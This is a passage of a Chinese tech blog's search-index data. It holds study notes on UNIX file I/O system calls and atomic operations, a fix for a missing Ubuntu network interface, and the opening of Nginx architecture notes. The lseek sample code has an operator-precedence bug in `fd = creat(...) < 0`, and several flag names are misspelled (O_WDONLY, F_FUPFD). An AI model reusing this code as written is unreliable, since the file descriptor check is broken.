","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:4:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 创建一个新文件 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:4:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cfcntl.h\u003e int creat(const char *path, mode_t mode); /* Return: 成功：返回只写打开的fd 错误：返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:4:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc creat 函数等价于 open(path, O_WDONLY | O_CREAT | O_TRUNC, mode);. creat 函数的不足之处是以只写方式打开创建的文件，如果要创建临时文件，并要写该文件，然后读该文件，就需要先调用 creat 、 close ，然后再调用 open，但是现在可以使用以下方式调用 open 实现： open (path, O_RDWR | O_CREAT | O_TRUNC, mode) ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:4:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"五、函数close ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:5:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 关闭一个打开的文件 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:5:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003e int close(int fd); /* Return: 成功：返回0 错误：返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:5:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc 关闭一个文件时会释放该进程加在该文件上的所有记录锁（后续说明）。 需要特别注意的是：当一个进程终止时，内核会自动关闭它所有的打开文件。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:5:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"六、函数 lseek ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:6:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 为一个打开文件设置文件偏移量 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:6:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003e off_t lseek(int fd, off_t offset, int whence); /* Return: 成功：返回新的文件偏移量 错误：返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:6:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. 参数 1. whence参数 可选值：SEEK_SET, SEEK_CUR, SEEK_END 2. offset参数 与 whence 参数相关： whence 解释 SEEK_SET 将该文件的偏移量设置为距文件开始处 offset 个字节 SEEK_CUR 将该文件的偏移量设置为当前值加上 offset， offset 有符号，可为负 SEEK_END 将该文件的偏移量设置为文件长度加上 offset， offset 有符号，可为负 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:6:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"4. misc 确定打开文件的当前偏移量： off_t currpos; currpos = lseek(fd, 0, SEEK_CUR); 如果fd指向一个管道、FIFO或网络套接字，则返回-1，并将 errno 设置为 ESPIPE。 lseek 仅将当前的文件偏移量记录在内核中，并不引起任何I/O操作，然后该偏移量用于下一个读/写操作。 空洞文件 文件偏移量可以大于文件的当前长度，在这种情况下，对该文件的下一次写操作将加长该文件，并在文件中构成一个空洞。位于文件中但没有写过的字节都被读为0。文件中的空洞并不占用磁盘存储，具体处理方式与文件系统实现有关，当定位超出文件尾端之后写时，对于新写的数据要分配磁盘块，但是对于原文件尾端和新开始写位置之间的部分则不需要分配磁盘块。 Show me your code： #include \"apue.h\" #include \u003cfcntl.h\u003e char buf1[] = \"abcdefghij\"; char buf2[] = \"ABCDEFGHIJ\"; int main(void){ int fd; if(fd = creat(\"fiel.hole\", FILE_MODE) \u003c 0) // file offset = 0 err_sys(\"creat error\"); if(write(fd, buf1, 10) != 10) // file offset = 10 err_sys(\"write buf1 error\"); if(lseek(fd, 16384, SEEK_SET) == -1) // file offset = 16384 err_sys(\"lseek error\"); if(write(fd, buf2, 10) != 10) // file offset = 16394 err_sys(\"write buf2 error\"); exit(0); } todo 补充运行截图 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:6:4","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"七、函数 read 和 write ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:7:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 read：从打开文件中读数据 write：向打开文件写数据 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:7:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003e ssize_t read(int fd, void *buf, size_t nbytes); /* Return: 成功：读取到的字节数，若已到文件末尾，返回0 错误：-1 */ ssize_t write(int fd, void *buf, size_t nbytes); /* Return: 成功：写入的字节数 错误：-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:7:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc 1. read 使实际读取的字节数少于要求读的字节数的情况： 读取普通文件时，在读取到要求字节数之前已到达文件末尾。 读取终端设备时，通常一次最多读一行 读取网络时，网络中的缓冲机制可能造成返回值小于要求读取的字节数 读取管道或FIFO时，如过管道包含的字节数少于要求的字节数，则只返回实际的字节数 读取面向记录的设备（如磁带）时，一次最多返回一个记录 读操作从文件的当前偏移量处开始，在成功返回之前，该偏移量将增加实际读取到的字节数。 2. write 返回值通常与参数 nbytes 数值相同，常见出错是磁盘写满或超过了给定进程的文件长度限制。 对于普通文件，写操作从文件的当前偏移量处开始，如果在打开该文件时指定了 O_APPEND 选项，则在每次写操作之前，将文件偏移量设置在文件的当前结尾处，在一次成功写之后，该文件偏移量增加实际写的字节数。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:7:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"八、函数 dup、dup2 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:8:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 复制一个现有的文件描述符 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:8:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003e int dup(int fd); int dup2(int fd, int fd2); /* Return: 成功：返回新的文件描述符 错误：返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:8:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc dup返回的新文件描述符一定是当前可用文件描述符中的最小数值。dup2可以由参数fd2指定新描述符的值。如果fd2已经打开，则先将其关闭，如果fd2等于fd，则dup2返回fd2，但是不关闭它。否则，fd2的FD_CLOEXEC文件描述符标志会被清除，这样fd2在进程调用exec时是打开状态。需要注意，函数返回的新文件描述符与参数fd共享同一个文件表项。 每个文件描述符都有它自己的一套文件描述符标志。 dup2是一个原子操作。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:8:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"九、函数 sync、fsync、fdatasync ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:9:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 传统UNIX系统实现在内核中设有缓冲区高速缓存或页高速缓存，大多数磁盘I/O都通过缓冲区进行。当向文件写入数据时，内核现将数据复制到缓冲区中，然后排入队列，然后在合适的时机再写入磁盘。这种方式称为“延时写（delayed write）”。 为了保证磁盘上实际文件系统与缓冲区中内容的一致性，UNIX提供了这三个函数。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:9:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003eint fsync(int fd); int fdatasync(int fd); /* Return: 成功：返回0 错误：返回-1 */ void sync(void); ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:9:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc sync函数只将所有修改过的块缓冲区排入写队列，然后就返回，并不等待实际的写磁盘操作结束。通常称为“update”的系统守护进程周期性地调用（一般30s）sync函数，以保证了定期冲洗（flush）内核的块缓冲区。命令sync(1)也调用sync函数。 fsync函数只对由文件描述符fd指定的一个文件起作用，并且等待写磁盘操作结束后才返回。fsync可以用于数据库这样的应用程序，这种应用程序需要确保修改过的块立即写到磁盘上。 fdatasync函数类似与fsync，但只影响文件的数据部分。而fsync还会更新除数据外的文件属性。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:9:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"十、函数 fcntl ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:10:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 改变已经打开的文件的属性 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:10:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cfcntl.h\u003e int fcntl(int fd, int cmd, ... /* int arg */); /* Return： 成功：取决于cmd 错误：返回-1 */ fcntl函数的5种功能： 复制一个已有的描述符（cmd = F_FUPFD or F_DUPFD_CLOEXEC） 获取/设置文件描述符标志（cmd = F_GETFD or F_SETFD） 获取/设置文件状态标志（cmd = F_GETFL or F_SETFL） 获取/设置异步I/O所有权（cmd = F_GETOWN or F_SETOWN） 获取/设置记录锁（cmd = F_GETLK, F_SETLK, F_SETLKW） ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:10:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc fcntl函数的重要性就在于在只知道打开文件的fd的情况下，就可以修改描述符的属性，在后续将对该函数进行深入讲解。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:10:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"十一、函数 ioctl ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:11:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"1. 作用 处理文中已列函数处理不了的功能。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:11:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"2. 定义 #include \u003cunistd.h\u003e /*System V*/ #include \u003csys/ioctl.h\u003e /*BSD and Linux*/ int ioctl(int fd, int request, ...); /* Return: 成功：返回其他值 错误：返回-1 */ ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:11:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"3. misc ioctl函数属于杂物箱性质的函数，专门处理其他函数处理不来的I/O操作，终端I/O是使用ioctl函数最多的地方。 每个设备驱动可以定义自己专用的一组ioctl命令，系统则为不同种类的设备提供通用的ioctl命令。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:11:3","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"十二、文件共享和原子操作 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:12:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"文件共享基础 UNIX系统支持在不同进程间共享打开文件。内核使用3种数据结构表示打开文件，它们之间的关系决定了在文件共享方面一个进程对另一个进程可能产生的影响： 每个进程在进程表中都有一个记录项，记录项中包含一张打开文件描述符表，可以将其视为一个矢量，每个描述符占用一项，与描述符相关联的是： 文件描述符标志(close_on_exec，如下面的图3-7) 指向一个文件表项的指针 内核为所有打开文件维持一张文件表，每个文件表项包括： 文件状态标志（读、写、添写、同步和非阻塞等） 当前文件偏移量 指向该文件v节点表项的指针 每个打开文件（或设备）都有一个v节点（v-node）结构，包含了文件类型和对此文件进行各种操作函数的指针。大多数文件的v节点还会包含该文件的i节点（i-node，索引节点）。 （Linux没有使用v节点，只用了通用的i节点。） 上图显示了一个进程对应的3张表之间的关系，该进程有两个不同的打开文件，一个文件从标准输入打开，一个文件从标准输出打开。 如果是两个进程各自打开了同一文件，则关系如下图： 从图上可以看到，每个进程都获得自己的文件表项，这可以使每个进程都有它自己的对该文件的当前偏移量。 完成write操作后，在文件表项的当前文件偏移量增加所写入的字节数，如果此时当前文件偏移量超过了当前文件长度，则将i节点表项中的当前文件长度设置为当前文件偏移量（即文件长度变长了） 如果用O_APPEND标志打开一个文件，则相应标志也被设置到文件表项的文件状态标志中。这里有个点需要注意，每次对这种具有追加写标志的文件执行写操作时，文件表项中的当前文件偏移量会首先被设置为i节点表项中的文件长度，这样每次写入的数据都追加到文件的当前尾端处。 若文件使用lseek定位到文件当前的尾端，则文件表项中的当前文件偏移量被设置为i节点表项中的当前文件长度。 lseek函数只修改文件表项中的当前文件偏移量，不进行任何I/O操作。 Notes：文件描述标志和文件状态标志在作用范围方面有所区别，前者只用于一个进程的一个描述符，后者则应用于指向该给定文件表项的任何进程中的所有描述符。 反复强调：每个进程都有自己的文件表项，其中也有它自己的当前文件偏移量。但是，当多个进程写同一文件时，有可能产生预想不到的结果。这就是后续的原子操作。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:12:1","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"原子操作 举个栗子： 有两个独立的进程A和B都对同一文件进行追加写操作。每个进程都已经打开了该文件，但是没有使用O_APPEND标志。此时的各数据结构之间的关系如图3-8所示。每个进程都有自己的文件表项，但是共享一个v节点表项。假设进程A调用了lseek，它将进程A的该文件当前偏移量设置为1500字节（当前文件尾端），然后内核切换进程，进程B运行。进程B执行lseek，也将其对该文件的当前偏移量设置为1500字节（当前文件尾端）。然后B调用write，他将B的该文件当前文件偏移量增加至1600。因为该文件长度已增加，所以内核将v节点中的当前文件长度更新为1600。然后，内核再次进行进程切换，使进程A恢复运行。当A调用write时，就从其当前文件偏移量（1500）处开始将数据写入文件。这样一来，进程B刚才写入到该文件中的数据就会被覆盖。 上述过程如下图所示： 问题出在哪里呢？ “先定位到文件尾端，再写”，这个过程使用了两个分开的函数调用。、 如何解决？ 将上述操作合并成一个操作，使其对于其他进程而言称为一个原子操作。 原子操作， atomic operation，指不会被进程或线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何的上下文切换（context switch）。原子操作可以是一个步骤，也可以是多个操作步骤，但是其顺序不可以被打乱，也不可以被切割而只执行其中一部分。原子性核心就是将整个操作视作一个整体。 回到上面的问题，UNIX系统为这样的操作提供了一个原子操作，即在打开文件时设置 O_APPEND标志，这使得内核在每次写操作之前，都将进程的当前偏移量设置到该文件的尾端处，于是在每次写之前就不再需要调用lseek。 原子操作的函数举例： 函数pread和pwrite： #include \u003cunistd.h\u003essize_t pread(int fd, void *buf, size_t nbytes, off_t offset); /* Return: 成功：读到的字节数，若已到文件尾，返回0 出错：返回-1 */ ssize_t pwrite(int fd, const void *buf, size_t nbytes, off_t offset); /* Return: 成功：返回已写的字节数 出错：返回-1 */ 调用pread相当于调用lseek后调用read，但是有区别： pread无法中断其定位和读操作 不更新当前文件偏移量 调用pwrite相当于调用lseek后调用write，区别与上面类似。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:12:2","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["UNIX"],"content":"十三、/dev/fd 较新的系统都提供名为/dev/fd的目录，其目录项是名为0，1，2等的文件，打开文件/dev/fd/n等于复制描述符n（假设n是打开的）。 Linux实现中的/dev/fd把文件描述符应设成指向底层物理文件的符号链接。例如，当打开/dev/fd/0时，事实上正在打开与标准输入关联的文件，因此返回的新文件描述符的模式与/dev/fd文件描述符的模式其实并不相关。 也可以用/dev/fd作为路径名参数调用create函数，这与调用open时用O_CREATE作为第二个参数作用相同。 ","date":"2021-07-01","objectID":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/:13:0","tags":["UNIX","I/O"],"title":"UNIX环境高级编程--文件I/O","uri":"/unix%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6io/"},{"categories":["Tech"],"content":"解决Ubuntu 20.04中eth0或ens33网卡突然消失的情况。","date":"2021-06-18","objectID":"/2021/06/Ubuntu/","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"Ubuntu 20.04 网络ens33消失问题解决 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:0:0","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"Ubuntu 20.04 突然丢失网卡驱动 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:0","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"1. 问题描述 Ubuntu 20.04 LTS版本，在进行一次suspend操作后，发现网卡驱动丢失。执行ifconfig命令未发现正常的eth0或ens33网卡，但是执行ifconfig -a可以发现ens33网卡存在，但是没有正常IP。 桌面右上角没有网络连接的图标，在设置中也没有网络设置相关内容。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:1","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"2. 解决 1. 临时解决办法 执行如下命令： sudo dhclient ens33 sudo ifconfig ens33 2. 稳定解决办法 清理原有的网络配置相关选项，重启网络。Ubuntu 20.04使用了NetworkManager`的网络服务管理程序。执行如下命令： service NetworkManager stop # 停止当前网络服务 sudo rm /var/lib/NetworkManager/NetworkManager.state # 建议在删除该状态文件前先进行备份 service NetworkManager start # 启动网络服务 经过以上步骤后，网络可恢复正常。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:2","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Tech"],"content":"3. 最后的最后 重置虚拟网络配置器。这是最后的办法，实在无法确定网络问题原因时再使用。 ","date":"2021-06-18","objectID":"/2021/06/Ubuntu/:1:3","tags":["Ubuntu","Linux"],"title":"Ubuntu 20.04 网络ens33消失问题解决","uri":"/2021/06/Ubuntu/"},{"categories":["Misc"],"content":"记录一下Nginx中比较基础但很重要的关键知识点。","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"记录一下Nginx中比较基础但很重要的关键知识点。 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:0:0","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx 核心技术 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:0","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. 设计目标 1. 性能 网络性能：使用 epoll 网络模型，在全异步模式下及多进程而非多线程模式的支持下，可以处理几万至几十万的并发请求。 网路效率：使用长连接以减少建立、关闭带来的网络交互，同时使用压缩算法提高网络利用率。 时延：使用带宽控制技术，使各会话之间带宽尽量相等 2. 可靠性 采用主从机制以看门狗形式管理工作进程，一旦有工作进程崩溃，立刻启动新的进程代替。 3. 伸缩性 使用组件技术，可以减少或增加使用的组件或使用自行开发的新组件，介入到HTTP请求处理的中间环节，改变处理行为。 4. 简单性 多组件及多阶段的方式使一个HTTP处理过程被分成了11个小阶段，每个阶段都可以非常简单，容易理解和实现，HTTP处理过程变成了流水线模式。 5. 可修改性 Nginx 定位专用的Web 服务器，需要具备动态修改配置、动态升级、动态部署的能力。 6. 可见性 关键组件的运行情况可以被监控，如网络吞吐量、网络连接数、缓存使用情况等。 7. 可移植性 跨平台能力，Nginx 支持Linux、Unix、Windows。 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:1","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. 架构 整体上看，Nginx 使用了事件驱动的服务模型，在模块机制中专门定义了 event 模块实现事件驱动。在事件基础上，Nginx 使用了多阶段的异步模型，将处理过程（如HTTP请求）划分7、9或11个阶段，每个阶段都异步处理。将请求多阶段处理，可以进一步控制每个请求的总体处理时间，因为每个阶段都细化，不会出现某个阶段过多占用CPU处理时间的问题。 管理进程和工作进程的机制使 Nginx 可以充分利用多处理器机制。 下面分别介绍关键的技术： 1. 事件驱动 Nginx 